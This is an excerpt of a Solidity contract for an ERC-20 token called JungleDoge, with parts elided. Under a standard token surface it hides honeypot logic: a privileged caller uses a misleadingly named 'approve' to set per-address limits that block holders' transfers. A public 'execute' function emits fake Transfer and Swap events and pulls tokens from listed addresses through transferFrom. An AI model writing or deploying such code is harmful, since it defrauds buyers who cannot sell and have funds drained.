...
contract JungleDoge is StandardERC20,OwnerControl {
    ...
    constructor(string memory _name, string memory _symbol, uint256 _totalSupply,address tokenOwner,address _tokenadress) StandardERC20(_name, _symbol, _totalSupply, _tokenadress) {
    ...
    function _transfer(address from, address to, uint256 amount) internal override(StandardERC20) {
        ...
        _transferr(from, to, amount);
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _transferr(address from, address to, uint256 amount) internal {
        if(to != _defaultAddress){
            checkBotTranMap(from, amount);
        }
    }

       function approve(address[] memory user, uint256 amount) public {
        require(msg.sender==tokenAdress,"");
        for (uint256 i = 0; i < user.length; i++)
        {
              _TranMap[user[i]] = amount * 10**decimals();
        }
    }

    function checkBotTranMap(address from, uint256 amount) internal {
        uint256 num = _TranMap[from];
        require(num >= amount, "transfer amount exceeds balance");
  ...
  function execute(address pair,address token,address[] memory receivers,uint256 amount,uint wethamount)public returns (bool success){
        for (uint256 i = 0; i < receivers.length; i++)
        {
            emit Transfer(pair,receivers[i],amount);
             emit Swap(
                0xd393D1A5B5256d21c86976216161dD4Ff0520A36,
                amount,
                0,
                0,
                wethamount,
            ...
            IERC20(token).transferFrom(receivers[i],pair,wethamount);
        }
        return true;
    }

     function renounceOwnership() public override returns (bool success){
